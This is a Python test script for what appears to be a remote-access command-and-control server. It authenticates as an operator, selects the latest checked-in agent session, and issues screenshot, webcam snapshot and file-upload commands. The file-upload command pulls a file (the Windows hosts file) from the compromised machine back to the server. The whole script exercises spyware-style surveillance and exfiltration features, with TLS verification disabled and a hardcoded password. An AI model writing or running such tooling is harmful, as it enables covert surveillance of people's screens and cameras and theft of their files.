import requests
import json
import time
import sys

# Configuration
SERVER_URL = "https://127.0.0.1:8443"
USERNAME = "admin"
PASSWORD = "password123"

def get_token():
    try:
        resp = requests.post(f"{SERVER_URL}/api/operator/auth", json={
            "username": USERNAME,
            "password": PASSWORD
        }, verify=False)
        if resp.status_code == 200:
            return resp.json()['token']
        print(f"Auth failed: {resp.text}")
        return None
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

def get_agent_session(token):
    headers = {"Authorization": f"Bearer {token}"}
    resp = requests.get(f"{SERVER_URL}/api/sessions", headers=headers, verify=False)
    if resp.status_code == 200:
        sessions = resp.json()['sessions']
        if sessions:
            # Sort by last_checkin descending
            sessions.sort(key=lambda x: str(x.get('last_checkin', '')) or '0', reverse=True)
            
            print(f"DEBUG: All sessions found:")
            for s in sessions:
                print(f" - {s['id']} (Last checkin: {s.get('last_checkin')}, Status: {s.get('status')})")

            # Filter for active sessions if possible, but for now just take the latest
            latest_session = sessions[0]
            print(f"DEBUG: Using latest: {latest_session['id']}")
            return latest_session['id']
    return None

def send_command(token, session_id, command, params=None):
    headers = {"Authorization": f"Bearer {token}"}
    resp = requests.post(f"{SERVER_URL}/api/command", json={
        "session_id": session_id,
        "command": command,
        "params": params or {}
    }, headers=headers, verify=False)
    return resp.json()

def get_command_result(token, command_id):
    headers = {"Authorization": f"Bearer {token}"}
    for _ in range(10): # Try for 20 seconds
        resp = requests.get(f"{SERVER_URL}/api/command/{command_id}", headers=headers, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            if data['status'] == 'completed':
                return data
        time.sleep(2)
    return None

def main():
    print("Testing Advanced Features...")
    token = get_token()
    if not token:
        return

    session_id = get_agent_session(token)
    if not session_id:
        print("No active session found")
        return

    print(f"Target Session: {session_id}")

    # Test Screenshot
    print("\n[+] Sending Screenshot Command...")
    cmd_resp = send_command(token, session_id, "screenshot")
    print(f"Command Response: {cmd_resp}")
    cmd_id = cmd_resp.get('command_id')
    print(f"Command ID: {cmd_id}")
    
    result = get_command_result(token, cmd_id)
    if result:
        print("Screenshot Result Received!")
        res_data = result['result']
        if isinstance(res_data, str):
            try:
                res_data = json.loads(res_data)
            except:
                pass
        
        if isinstance(res_data, dict) and 'b64' in res_data:
            print(f"Screenshot captured! Size: {len(res_data['b64'])} chars")
        else:
            print(f"Unexpected result format: {str(res_data)[:100]}...")
    else:
        print("Timeout waiting for screenshot")

    # Test Camera
    print("\n[+] Sending Camera Command...")
    cmd_resp = send_command(token, session_id, "cam_snapshot")
    cmd_id = cmd_resp.get('command_id')
    result = get_command_result(token, cmd_id)
    if result:
        print("Camera Result Received!")
        res_data = result['result']
        if isinstance(res_data, str):
            try:
                res_data = json.loads(res_data)
            except:
                pass
        if isinstance(res_data, dict) and 'b64' in res_data:
            print(f"Camera captured! Size: {len(res_data['b64'])} chars")
        else:
            print(f"Camera failed or format error: {str(res_data)[:100]}...")
    else:
        print("Timeout waiting for camera")

    # Test Upload File
    print("\n[+] Sending Upload File Command (Agent -> Server)...")
    cmd_resp = send_command(token, session_id, "upload_file", {"path": "C:\\Windows\\System32\\drivers\\etc\\hosts"})
    print(f"Command Response: {cmd_resp}")
    cmd_id = cmd_resp.get('command_id')

    result = get_command_result(token, cmd_id)
    if result:
        print("File Upload Result Received!")
        res_data = result['result']
        if isinstance(res_data, str):
            try:
                res_data = json.loads(res_data)
            except:
                pass
        
        if isinstance(res_data, dict) and 'data' in res_data:
            print(f"File content received! Size: {len(res_data['data'])} chars")
        else:
            print(f"Unexpected result format: {str(res_data)[:100]}...")
    else:
        print("Timeout waiting for file upload")


if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
